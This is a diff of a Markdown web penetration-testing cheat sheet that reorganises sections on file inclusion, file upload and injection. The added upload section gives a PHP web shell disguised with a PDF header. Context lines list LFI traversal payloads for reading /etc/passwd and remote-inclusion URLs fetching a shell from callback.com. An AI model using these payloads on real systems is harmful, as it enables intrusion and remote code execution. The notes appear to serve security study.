@@ -129,18 +129,26 @@ wpscan
 	Brute force log in  
 	SQL injection  
 
-# File Upload Pages  
 
-## Local File Include       
+# File Inclusion    
 [Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
 [Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
 [PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
 
-### Testing 
+## Local File Inclusion 
+### File Upload Pages
+
+Bypass extension filtering: rename shell 
+Bypass header check: 
+
+    %PDF-1.4
+    <?php system($_GET["cmd"]); ?>
+
+### LFI Testing 
 Check for client side scripts 
 
     http://example.com/index.php?page=../../../etc/passwd  
-    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 
+    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
     http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
     http://example.com/index.php?page=....//....//etc/passwd
     http://example.com/index.php?page=..///////..////..//////etc/passwd
@@ -212,7 +220,7 @@ WAR
     http://example.com/index.php?page=http://callback.com/shell.txt%00
     http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
 	
-## Command Injection 
+# Command Injection 
 [Payloads](https://github.com/payloadbox) 
 
 ## XSS
@@ -329,9 +337,12 @@ https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
 [Web vulnerabilities to gain access to the system - paper](https://www.exploit-db.com/papers/13017/)     
 
 Basic SQLi 
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html 
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html 
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html 
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html  
+
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html  
+
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html  
+
 http://www.sqlinjection.net/login/
 
 ## Sources 
